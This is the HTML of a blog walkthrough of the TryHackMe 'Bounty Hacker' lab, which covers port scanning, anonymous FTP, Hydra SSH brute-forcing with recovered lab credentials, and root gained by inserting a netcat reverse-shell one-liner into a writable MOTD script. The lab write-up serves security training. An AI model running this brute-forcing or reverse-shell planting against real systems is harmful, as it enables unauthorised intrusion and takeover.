<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>TryHackMe - Bounty Hacker | Umar_0x01 ‚Äì Pentester | Programmer | Your average sakurity guy ( Õ°~ Õú ñ Õ°¬∞)</title><meta name=keywords content="tryhackme,nmap,ftp,ssh,http,gobuster,cewl,hydra,bruteforcing,privesc"><meta name=description content="Walkthrough of the machine Bounty Hacker on TryHackMe - https://tryhackme.com/room/cowboyhacker"><meta name=author content="Umar_0x01"><link rel=canonical href=https://umar0x01.sh/post/bounty-hacker-thm/><meta name=google-site-verification content="GTM-TZKBTKP"><link crossorigin=anonymous href=/assets/css/stylesheet.min.59f065735d47f1e8b3aab68fc9c773b722b5adf3f4e6096c42e8a1f8db8b3822.css integrity="sha256-WfBlc11H8eizqraPycdztyK1rfP05glsQuih+NuLOCI=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.min.7680afc38aa6b15ddf158a4f3780b7b1f7dde7e91d26f073e6229bb7a0793c92.js integrity="sha256-doCvw4qmsV3fFYpPN4C3sffd5+kdJvBz5iKbt6B5PJI=" onload=hljs.initHighlightingOnLoad()></script><link rel=icon href=https://umar0x01.sh/favicon/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://umar0x01.sh/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://umar0x01.sh/favicon/favicon-32x32.png><link rel=apple-touch-icon href=https://umar0x01.sh/favicon/apple-touch-icon.png><link rel=mask-icon href=https://umar0x01.sh/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><meta name=generator content="Hugo 0.82.0"><script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(a,e,f,g,b,c,d){a.GoogleAnalyticsObject=b,a[b]=a[b]||function(){(a[b].q=a[b].q||[]).push(arguments)},a[b].l=1*new Date,c=e.createElement(f),d=e.getElementsByTagName(f)[0],c.async=1,c.src=g,d.parentNode.insertBefore(c,d)}(window,document,'script','https://www.google-analytics.com/analytics.js','ga'),ga('create','UA-177361132-1','auto'),ga('send','pageview'))</script><meta property="og:title" content="TryHackMe - Bounty Hacker"><meta property="og:description" content="Walkthrough of the machine Bounty Hacker on TryHackMe - https://tryhackme.com/room/cowboyhacker"><meta property="og:type" content="article"><meta property="og:url" content="https://umar0x01.sh/post/bounty-hacker-thm/"><meta property="og:image" content="https://umar0x01.sh/images/bounty_hacker-thm/Untitled%202.png"><meta property="article:section" content="post"><meta property="article:published_time" content="2021-04-08T00:00:00+00:00"><meta property="article:modified_time" content="2021-04-08T00:00:00+00:00"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://umar0x01.sh/images/bounty_hacker-thm/Untitled%202.png"><meta name=twitter:title content="TryHackMe - Bounty Hacker"><meta name=twitter:description content="Walkthrough of the machine Bounty Hacker on TryHackMe - https://tryhackme.com/room/cowboyhacker"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":2,"name":"Posts","item":"https://umar0x01.sh/post/"},{"@type":"ListItem","position":3,"name":"TryHackMe - Bounty Hacker","item":"https://umar0x01.sh/post/bounty-hacker-thm/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"TryHackMe - Bounty Hacker","name":"TryHackMe - Bounty Hacker","description":"Walkthrough of the machine Bounty Hacker on TryHackMe - https://tryhackme.com/room/cowboyhacker","keywords":["tryhackme","nmap","ftp","ssh","http","gobuster","cewl","hydra","bruteforcing","privesc"],"articleBody":"Enumeration  Host: 10.10.56.222\n Let‚Äôs start with nmap scan against the host and see the ports open on it.\n‚îå‚îÄ‚îÄ(rootüíÄb0x)-[/mnt/hgfs/THM/Bounty Hacker] [1/377] ‚îî‚îÄ# nmap -A 10.10.56.222 -Pn -n Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower. Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-09 00:03 PKT Nmap scan report for 10.10.56.222 Host is up (0.21s latency). Not shown: 967 filtered ports, 30 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 | ftp-anon: Anonymous FTP login allowed (FTP code 230) | -rw-rw-r-- 1 ftp ftp 418 Jun 07 2020 locks.txt |_-rw-rw-r-- 1 ftp ftp 68 Jun 07 2020 task.txt | ftp-syst: | STAT: | FTP server status: | Connected to ::ffff:10.17.0.120 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | At session startup, client count was 1 | vsFTPd 3.0.3 - secure, fast, stable |_End of status 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 dc:f8:df:a7:a6:00:6d:18:b0:70:2b:a5:aa:a6:14:3e (RSA) | 256 ec:c0:f2:d9:1e:6f:48:7d:38:9a:e3:bb:08:c4:0c:c9 (ECDSA) |_ 256 a4:1a:15:a5:d4:b1:cf:8f:16:50:3a:7d:d0:d8:13:c2 (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Site doesn't have a title (text/html). Aggressive OS guesses: HP P2000 G3 NAS device (91%), Linux 2.6.32 (89%), Infomir MAG-250 set-top box (89%), Ubiquiti AirMax NanoStation WAP (Linux 2.6.32) (89%), Linux 3.7 (89%), Netgear RAIDiator 4.2.21 (Linux 2.6.37) (89%), Linux 2.6.32 - 3.13 (89%), Linux 3.0 - 3.2 (89%), Linux 3.3 (89%), Linux 2.6.32 - 3.1 (88%) No exact OS matches for host (test conditions non-ideal). Network Distance: 5 hops Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 41511/tcp) HOP RTT ADDRESS 1 63.06 ms 10.17.0.1 2 ... 4 5 238.98 ms 10.10.56.222 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 38.33 seconds Alright, we can see three ports open. Let‚Äôs enumerate the FTP (21) port first.\nFTP - Port (21) No exploits found for the version reported. Let‚Äôs try anonymous login against the FTP port open.\n‚îå‚îÄ‚îÄ(rootüíÄb0x)-[/mnt/hgfs/THM/Bounty Hacker] ‚îî‚îÄ# ftp 10.10.56.222 21  Connected to 10.10.56.222. 220 (vsFTPd 3.0.3) Name (10.10.56.222:root): anonymous 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp dir 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. -rw-rw-r-- 1 ftp ftp 418 Jun 07 2020 locks.txt -rw-rw-r-- 1 ftp ftp 68 Jun 07 2020 task.txt 226 Directory send OK. ftp get locks.txt local: locks.txt remote: locks.txt 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for locks.txt (418 bytes). 226 Transfer complete. 418 bytes received in 0.08 secs (5.2431 kB/s) ftp get task.txt local: task.txt remote: task.txt 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for task.txt (68 bytes). 226 Transfer complete. 68 bytes received in 0.08 secs (0.8768 kB/s) ftp Alright, anonymous login enabled on FTP. Downloaded two files present on it as well.\n‚îå‚îÄ‚îÄ(rootüíÄb0x)-[/mnt/hgfs/THM/Bounty Hacker] ‚îî‚îÄ# cat locks.txt  rEddrAGON ReDdr4g0nSynd!cat3 Dr@gOn$yn9icat3 R3DDr46ONSYndIC@Te ReddRA60N R3dDrag0nSynd1c4te dRa6oN5YNDiCATE ReDDR4g0n5ynDIc4te R3Dr4gOn2044 RedDr4gonSynd1cat3 R3dDRaG0Nsynd1c@T3 Synd1c4teDr@g0n reddRAg0N REddRaG0N5yNdIc47e Dra6oN$yndIC@t3 4L1mi6H71StHeB357 rEDdragOn$ynd1c473 DrAgoN5ynD1cATE ReDdrag0n$ynd1cate Dr@gOn$yND1C4Te RedDr@gonSyn9ic47e REd$yNdIc47e dr@goN5YNd1c@73 rEDdrAGOnSyNDiCat3 r3ddr@g0N ReDSynd1ca7e ‚îå‚îÄ‚îÄ(rootüíÄb0x)-[/mnt/hgfs/THM/Bounty Hacker] ‚îî‚îÄ# cat task.txt  1.) Protect Vicious. 2.) Plan for Red Eye pickup on the moon. -lin The first file includes passwords and the second some instructions? ‚Äî Let‚Äôs pause this for now and move onto HTTP.\n HTTP - Port (80) The site has many usernames in it, maybe we can use cewl to get all the usernames? and use the passwords above to bruteforcing SSH?\nLet‚Äôs bruteforce later. First, enumerate the local directories on the webserver using gobuster.\n‚îå‚îÄ‚îÄ(rootüíÄb0x)-[/mnt/hgfs/THM/Bounty Hacker] ‚îî‚îÄ# gobuster dir -u http://10.10.56.222 -w /usr/share/wordlists/dirb/common.txt -k -e -b 404 -t 100  =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) \u0026 Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.56.222 [+] Method: GET [+] Threads: 100 [+] Wordlist: /usr/share/wordlists/dirb/common.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Expanded: true [+] Timeout: 10s =============================================================== 2021/04/08 23:59:34 Starting gobuster in directory enumeration mode =============================================================== http://10.10.56.222/.htaccess (Status: 403) [Size: 277] http://10.10.56.222/.hta (Status: 403) [Size: 277] http://10.10.56.222/.htpasswd (Status: 403) [Size: 277] http://10.10.56.222/images (Status: 301) [Size: 313] [-- http://10.10.56.222/images/] http://10.10.56.222/index.html (Status: 200) [Size: 969] http://10.10.56.222/server-status (Status: 403) [Size: 277] =============================================================== 2021/04/08 23:59:55 Finished =============================================================== Nothing interesting with common.txt wordlist and no extensions. Let‚Äôs try with extensions maybe?\n‚îå‚îÄ‚îÄ(rootüíÄb0x)-[/mnt/hgfs/THM/Bounty Hacker] ‚îî‚îÄ# gobuster dir -u http://10.10.56.222 -w /usr/share/wordlists/dirb/common.txt -k -e -b 404,403 -t 100 -x php,jsp,rb,py,js,asp,aspx,zip,sql,tar,txt,key,doc,docx,html,jar,groovy,back,xml,ini,inc,config,json,yml,conf,cgi =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) \u0026 Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.56.222 [+] Method: GET [+] Threads: 100 [+] Wordlist: /usr/share/wordlists/dirb/common.txt [+] Negative Status codes: 403,404 [+] User Agent: gobuster/3.1.0 [+] Extensions: js,zip,key,doc,docx,xml,cgi,jsp,py,jar,sql,groovy,inc,config,php,rb,asp,aspx,tar,txt,html,back,ini,json,yml,conf [+] Expanded: true [+] Timeout: 10s =============================================================== 2021/04/09 00:00:20 Starting gobuster in directory enumeration mode =============================================================== http://10.10.56.222/images (Status: 301) [Size: 313] [-- http://10.10.56.222/images/] http://10.10.56.222/index.html (Status: 200) [Size: 969] http://10.10.56.222/index.html (Status: 200) [Size: 969] =============================================================== 2021/04/09 00:05:33 Finished ===============================================================  Nothing with that either, let‚Äôs start another scan with /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt and keep it running in the background and move with cewl against the site.\n Running cewl:\n‚îå‚îÄ‚îÄ(rootüíÄb0x)-[/mnt/hgfs/THM/Bounty Hacker] ‚îî‚îÄ# cewl -k -d 10 -w potential-usernames.txt -a -e http://10.10.56.222 1 ‚®Ø CeWL 5.4.8 (Inclusion) Robin Wood (robin@digi.ninja) (https://digi.ninja/) The running arguments mean:\n -k, --keep: Keep the downloaded file. -d ,--depth : Depth to spider to, default 2. -w, --write: Write the output to the file. -a, --meta: include meta data. -e, --email: Include email addresses.  The argument -e wasn‚Äôt required. Let‚Äôs now try the list against SSH open on the host.\nAlright, let‚Äôs try all the things we‚Äôve in todo.\n Bruteforce using cewl list against rocks.txt Bruteforce using rocks.txt list against rocks.txt   Bruteforce using cewl list against rocks.txt\n ‚îå‚îÄ‚îÄ(rootüíÄb0x)-[/mnt/hgfs/THM/Bounty Hacker] ‚îî‚îÄ# hydra -L potential-usernames.txt -P locks.txt 10.10.56.222 -s 22 ssh -vV Hydra v9.1 (c) 2020 by van Hauser/THC \u0026 David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway). Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-04-09 00:21:23 [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4 [DATA] max 16 tasks per 1 server, overall 16 tasks, 1898 login tries (l:73/p:26), ~119 tries per task [DATA] attacking ssh://10.10.56.222:22/ [VERBOSE] Resolving addresses ... [VERBOSE] resolving done [INFO] Testing if password authentication is supported by ssh://you@10.10.56.222:22 [INFO] Successful, password authentication is supported by ssh://10.10.56.222:22 [ATTEMPT] target 10.10.56.222 - login \"you\" - pass \"rEddrAGON\" - 1 of 1898 [child 0] (0/0) [ATTEMPT] target 10.10.56.222 - login \"you\" - pass \"ReDdr4g0nSynd!cat3\" - 2 of 1898 [child 1] (0/0) [ATTEMPT] target 10.10.56.222 - login \"you\" - pass \"Dr@gOn$yn9icat3\" - 3 of 1898 [child 2] (0/0) [ATTEMPT] target 10.10.56.222 - login \"you\" - pass \"R3DDr46ONSYndIC@Te\" - 4 of 1898 [child 3] (0/0) [ATTEMPT] target 10.10.56.222 - login \"you\" - pass \"ReddRA60N\" - 5 of 1898 [child 4] (0/0) [ATTEMPT] target 10.10.56.222 - login \"you\" - pass \"R3dDrag0nSynd1c4te\" - 6 of 1898 [child 5] (0/0) ... That didn‚Äôt work, let‚Äôs continue to the other combination of lists.\n Bruteforce using rocks.txt list against rocks.txt\n ‚îå‚îÄ‚îÄ(rootüíÄb0x)-[/mnt/hgfs/THM/Bounty Hacker] ‚îî‚îÄ# grc hydra -L locks.txt -P locks.txt 10.10.56.222 -s 22 ssh -vV -I  Hydra v9.1 (c) 2020 by van Hauser/THC \u0026 David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway). Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-04-09 00:21:54 [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4 [WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore [DATA] max 16 tasks per 1 server, overall 16 tasks, 676 login tries (l:26/p:26), ~43 tries per task [DATA] attacking ssh://10.10.56.222:22/ [VERBOSE] Resolving addresses ... [VERBOSE] resolving done [INFO] Testing if password authentication is supported by ssh://rEddrAGON@10.10.56.222:22 [INFO] Successful, password authentication is supported by ssh://10.10.56.222:22 [ATTEMPT] target 10.10.56.222 - login \"rEddrAGON\" - pass \"rEddrAGON\" - 1 of 676 [child 0] (0/0) [ATTEMPT] target 10.10.56.222 - login \"rEddrAGON\" - pass \"ReDdr4g0nSynd!cat3\" - 2 of 676 [child 1] (0/0) [ATTEMPT] target 10.10.56.222 - login \"rEddrAGON\" - pass \"Dr@gOn$yn9icat3\" - 3 of 676 [child 2] (0/0) [ATTEMPT] target 10.10.56.222 - login \"rEddrAGON\" - pass \"R3DDr46ONSYndIC@Te\" - 4 of 676 [child 3] (0/0) .... Scan went on and nothing!\n‚Äî\nNow we need to go back to our findings, since, we aren‚Äôt able to move forward with these. Relooking at the file task.txt, we can see that it also has an username in it.\n‚îå‚îÄ‚îÄ(rootüíÄb0x)-[/mnt/hgfs/THM/Bounty Hacker] ‚îî‚îÄ# cat task.txt 1.) Protect Vicious. 2.) Plan for Red Eye pickup on the moon. -lin See that lin signature/name in the end? Let‚Äôs try that with the list rocks.txt against the host.\nExploitation ‚îå‚îÄ‚îÄ(rootüíÄb0x)-[/mnt/hgfs/THM/Bounty Hacker] ‚îî‚îÄ# hydra -l lin -P locks.txt 10.10.56.222 -s 22 ssh -t 4 -I 130 ‚®Ø Hydra v9.1 (c) 2020 by van Hauser/THC \u0026 David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway). Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-04-09 00:29:38 [DATA] max 4 tasks per 1 server, overall 4 tasks, 26 login tries (l:1/p:26), ~7 tries per task [DATA] attacking ssh://10.10.56.222:22/ [22][ssh] host: 10.10.56.222 login: lin password: RedDr4gonSynd1cat3 1 of 1 target successfully completed, 1 valid password found Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-04-09 00:29:50 ‚Äî\nThat worked!\nlin:RedDr4gonSynd1cat3\n‚Äî\nLet‚Äôs SSH into the host and grab the user.txt flag\n‚îå‚îÄ‚îÄ(rootüíÄb0x)-[/mnt/hgfs/THM/Bounty Hacker] ‚îî‚îÄ# ssh lin@10.10.56.222  The authenticity of host '10.10.56.222 (10.10.56.222)' can't be established. ECDSA key fingerprint is SHA256:fzjl1gnXyEZI9px29GF/tJr+u8o9i88XXfjggSbAgbE. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added '10.10.56.222' (ECDSA) to the list of known hosts. lin@10.10.56.222's password:  Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-101-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage 83 packages can be updated. 0 updates are security updates. Last login: Sun Jun 7 22:23:41 2020 from 192.168.0.14 lin@bountyhacker:~/Desktop$ lin@bountyhacker:~/Desktop$ id uid=1001(lin) gid=1001(lin) groups=1001(lin) lin@bountyhacker:~/Desktop$ lin@bountyhacker:~/Desktop$ wc -c user.txt 21 user.txt We‚Äôre inside! üíÄ ‚Äî\nSubmitted flag and I just realized that I should have taken a look at hints to save some of the time wasted in using bogus lists! üòñ\nOh well, can‚Äôt reverse time üôè\nPrivileges Escalation Let‚Äôs run [linpeas.sh](http://linpeas.sh)\nlin@bountyhacker:~$ wget http://10.17.0.120/linpeas.sh \u0026\u0026 chmod +x linpeas.sh --2021-04-08 14:34:29-- http://10.17.0.120/linpeas.sh Connecting to 10.17.0.120:80... connected. HTTP request sent, awaiting response... 200 OK Length: 328992 (321K) [text/x-sh] Saving to: ‚Äòlinpeas.sh‚Äô linpeas.sh 100%[=====================================================================================================================] 321.28K 262KB/s in 1.2s 2021-04-08 14:34:31 (262 KB/s) - ‚Äòlinpeas.sh‚Äô saved [328992/328992] lin@bountyhacker:~$ lin@bountyhacker:~$ ./linpeas.sh Let‚Äôs go through the interesting things.\n[+] Interesting Firefox Files [i] https://book.hacktricks.xyz/forensics/basic-forensics-esp/browser-artifacts#firefox  Found /home/lin/.mozilla /home/lin/.mozilla/firefox/o0cm87l0.default-release/addons.json /home/lin/.mozilla/firefox/o0cm87l0.default-release/bookmarkbackups /home/lin/.mozilla/firefox/o0cm87l0.default-release/cookies.sqlite /home/lin/.mozilla/firefox/o0cm87l0.default-release/favicons.sqlite /home/lin/.mozilla/firefox/o0cm87l0.default-release/formhistory.sqlite /home/lin/.mozilla/firefox/o0cm87l0.default-release/handlers.json /home/lin/.mozilla/firefox/o0cm87l0.default-release/key4.db /home/lin/.mozilla/firefox/o0cm87l0.default-release/places.sqlite /home/lin/.mozilla/firefox/o0cm87l0.default-release/prefs.js Can we use firefox‚Äôs credentials db for passwords? Let‚Äôs check all in the end.\n[+] Interesting writable files owned by me or writable by everyone (not in Home) (max 500) [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files  /dev/mqueue /dev/shm /etc/update-motd.d/00-header /home/lin /run/lock /run/user/1001 /run/user/1001/systemd /tmp /tmp/.font-unix /tmp/.ICE-unix /tmp/.Test-unix /tmp/.X11-unix /tmp/.XIM-unix /var/crash /var/lib/lightdm-data/lin /var/metrics /var/tmp /etc/update-motd.d/00-header is writeable? really? Noice! We can edit this and SSH again as our user to execute this and get reverse shell!\nlin@bountyhacker:~$ ls -la /etc/update-motd.d/00-header -rwxr-xrwx 1 root root 1221 Jun 7 2020 /etc/update-motd.d/00-header It is indded writeable! Let‚Äôs add reverse shell one liner in the file right after shebang #!/bin/sh\nlin@bountyhacker:~$ which nc /bin/nc Let‚Äôs use the following for reverses shell on port 5555 of our host.\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2\u00261|nc 10.17.0.120 5555 /tmp/f After adding reverse shell one-liner to the file, it looks like:\n#!/bin/sh  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2\u00261|nc 10.17.0.120 5555 /tmp/f # # 00-header - create the header of the MOTD # Copyright (C) 2009-2010 Canonical Ltd. # # Authors: Dustin Kirkland  # # This program is free software; you can redistribute it and/or modify # it under the terms of the GNU General Public License as published by # the Free Software Foundation; either version 2 of the License, or # (at your option) any later version. # # This program is distributed in the hope that it will be useful, # but WITHOUT ANY WARRANTY; without even the implied warranty of # MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the # GNU General Public License for more details. # # You should have received a copy of the GNU General Public License along # with this program; if not, write to the Free Software Foundation, Inc., # 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA. [ -r /etc/lsb-release ] \u0026\u0026 . /etc/lsb-release if [ -z \"$DISTRIB_DESCRIPTION\" ] \u0026\u0026 [ -x /usr/bin/lsb_release ]; then # Fall back to using the very slow lsb_release utility DISTRIB_DESCRIPTION=$(lsb_release -s -d) fi printf \"Welcome to %s (%s %s %s)\\n\" \"$DISTRIB_DESCRIPTION\" \"$(uname -o)\" \"$(uname -r)\" \"$(uname -m)\" Can see our one-liner in the second line, let‚Äôs save this and do SSH again as the user lin. Remember to start listener on port 5555 beforehand!\nRoot shell! Alright, that was an easy machine but we wasted more than necessary time (i.e. 30 minutes on an easy machine).\nHopefully, you enjoyed the writeup! üòá\n Things learnt (and not todos):  Always check the files we already have for username/passwords Don‚Äôt waste unnecessary time with long lists bruteforcing against slow protocols  ","wordCount":"2204","inLanguage":"en","image":"https://umar0x01.sh/images/bounty_hacker-thm/Untitled%202.png","datePublished":"2021-04-08T00:00:00Z","dateModified":"2021-04-08T00:00:00Z","author":{"@type":"Person","name":"Umar_0x01"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://umar0x01.sh/post/bounty-hacker-thm/"},"publisher":{"@type":"Organization","name":"Umar_0x01 ‚Äì Pentester | Programmer | Your average sakurity guy ( Õ°~ Õú ñ Õ°¬∞)","logo":{"@type":"ImageObject","url":"https://umar0x01.sh/favicon/favicon.ico"}}}</script></head><body class=dark id=top><script>localStorage.getItem("pref-theme")==="light"&&document.body.classList.remove('dark')</script><noscript><style type=text/css>#theme-toggle,.top-link{display:none}</style></noscript><header class=header><nav class=nav><div class=logo><a class=label_text_header href=https://umar0x01.sh accesskey=h title="> umar_0x01 | blog (Alt + H)"><span id=cusor_blink>></span> umar_0x01 | blog</a>
<span class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></span></div><ul id=menu onscroll=menu_on_scroll()><li><a href=https://umar0x01.sh/archives/ title=Posts><span>Posts</span></a></li><li><a href=https://umar0x01.sh/anime/ title=Anime><span>Anime</span></a></li><li><a href=https://umar0x01.sh/categories/ title=Categories><span>Categories</span></a></li><li><a href=https://umar0x01.sh/search/ title="Search (Alt + /)" accesskey=/><span>Search</span></a></li><li><a href=https://umar0x01.sh/tags/ title=Tags><span>Tags</span></a></li></ul></nav><script type=text/javascript>var cursor=!0,speed=500;setInterval(()=>{cursor?(document.getElementById('cusor_blink').style.opacity=0,cursor=!1):(document.getElementById('cusor_blink').style.opacity=1,cursor=!0)},speed)</script></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://umar0x01.sh>Home</a>&nbsp;¬ª&nbsp;<a href=https://umar0x01.sh/post/>Posts</a></div><h1 class=post-title>TryHackMe - Bounty Hacker</h1><div class=post-description>Walkthrough of the machine Bounty Hacker on TryHackMe - https://tryhackme.com/room/cowboyhacker</div><div class=post-meta>April 8, 2021&nbsp;¬∑&nbsp;11 min&nbsp;¬∑&nbsp;Umar_0x01</div></header><div class=post-content><h2 id=enumeration>Enumeration<a hidden class=anchor aria-hidden=true href=#enumeration>#</a></h2><hr><p><strong>Host:</strong> 10.10.56.222</p><hr><p>Let&rsquo;s start with nmap scan against the host and see the ports open on it.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-csharp data-lang=csharp><span style=color:#960050;background-color:#1e0010>‚îå‚îÄ‚îÄ</span>(root<span style=color:#960050;background-color:#1e0010>üíÄ</span>b0x)-[/mnt/hgfs/THM/Bounty Hacker]                                                                                                                                                                [<span style=color:#ae81ff>1</span>/<span style=color:#ae81ff>377</span>]
<span style=color:#960050;background-color:#1e0010>‚îî‚îÄ#</span> nmap -A <span style=color:#ae81ff>10.10</span>.<span style=color:#ae81ff>56.222</span> -Pn -n                                                                           
Host discovery disabled (-Pn). All addresses will be marked <span style=color:#960050;background-color:#1e0010>&#39;</span>up<span style=color:#960050;background-color:#1e0010>&#39;</span> and scan times will be slower.
Starting Nmap <span style=color:#ae81ff>7.91</span> ( https:<span style=color:#75715e>//nmap.org ) at 2021-04-09 00:03 PKT
</span><span style=color:#75715e></span>Nmap scan report <span style=color:#66d9ef>for</span> <span style=color:#ae81ff>10.10</span>.<span style=color:#ae81ff>56.222</span>
Host <span style=color:#66d9ef>is</span> up (<span style=color:#ae81ff>0.21</span>s latency).
Not shown: <span style=color:#ae81ff>967</span> filtered ports, <span style=color:#ae81ff>30</span> closed ports
PORT   STATE SERVICE VERSION
<span style=color:#ae81ff>21</span>/tcp open  ftp     vsftpd <span style=color:#ae81ff>3.0</span>.<span style=color:#ae81ff>3</span>
| ftp-anon: Anonymous FTP login allowed (FTP code <span style=color:#ae81ff>230</span>)
| -rw-rw-r--    <span style=color:#ae81ff>1</span> ftp      ftp           <span style=color:#ae81ff>418</span> Jun <span style=color:#ae81ff>07</span>  <span style=color:#ae81ff>2020</span> locks.txt
|_-rw-rw-r--    <span style=color:#ae81ff>1</span> ftp      ftp            <span style=color:#ae81ff>68</span> Jun <span style=color:#ae81ff>07</span>  <span style=color:#ae81ff>2020</span> task.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:<span style=color:#ae81ff>10.17</span>.<span style=color:#ae81ff>0.120</span>
|      Logged <span style=color:#66d9ef>in</span> <span style=color:#66d9ef>as</span> ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout <span style=color:#66d9ef>in</span> seconds <span style=color:#66d9ef>is</span> <span style=color:#ae81ff>300</span>
|      Control connection <span style=color:#66d9ef>is</span> plain text
|      Data connections will be plain text
|      At session startup, client count was <span style=color:#ae81ff>1</span>
|      vsFTPd <span style=color:#ae81ff>3.0</span>.<span style=color:#ae81ff>3</span> - secure, fast, stable
|_End of status
<span style=color:#ae81ff>22</span>/tcp open  ssh     OpenSSH <span style=color:#ae81ff>7.2</span>p2 Ubuntu <span style=color:#ae81ff>4</span>ubuntu2.<span style=color:#ae81ff>8</span> (Ubuntu Linux; protocol <span style=color:#ae81ff>2.0</span>)
| ssh-hostkey: 
|   <span style=color:#ae81ff>2048</span> dc:f8:df:a7:a6:<span style=color:#ae81ff>00</span>:<span style=color:#ae81ff>6d</span>:<span style=color:#ae81ff>18</span>:b0:<span style=color:#ae81ff>70</span>:<span style=color:#ae81ff>2</span>b:a5:aa:a6:<span style=color:#ae81ff>14</span>:<span style=color:#ae81ff>3</span>e (RSA)
|   <span style=color:#ae81ff>256</span> ec:c0:f2:d9:<span style=color:#ae81ff>1</span>e:<span style=color:#ae81ff>6f</span>:<span style=color:#ae81ff>48</span>:<span style=color:#ae81ff>7d</span>:<span style=color:#ae81ff>38</span>:<span style=color:#ae81ff>9</span>a:e3:bb:<span style=color:#ae81ff>08</span>:c4:<span style=color:#ae81ff>0</span>c:c9 (ECDSA)
|_  <span style=color:#ae81ff>256</span> a4:<span style=color:#ae81ff>1</span>a:<span style=color:#ae81ff>15</span>:a5:d4:b1:cf:<span style=color:#ae81ff>8f</span>:<span style=color:#ae81ff>16</span>:<span style=color:#ae81ff>50</span>:<span style=color:#ae81ff>3</span>a:<span style=color:#ae81ff>7d</span>:d0:d8:<span style=color:#ae81ff>13</span>:c2 (ED25519)
<span style=color:#ae81ff>80</span>/tcp open  http    Apache httpd <span style=color:#ae81ff>2.4</span>.<span style=color:#ae81ff>18</span> ((Ubuntu))
|_http-server-header: Apache/<span style=color:#ae81ff>2.4</span>.<span style=color:#ae81ff>18</span> (Ubuntu)
|_http-title: Site doesn<span style=color:#960050;background-color:#1e0010>&#39;</span>t have a title (text/html).
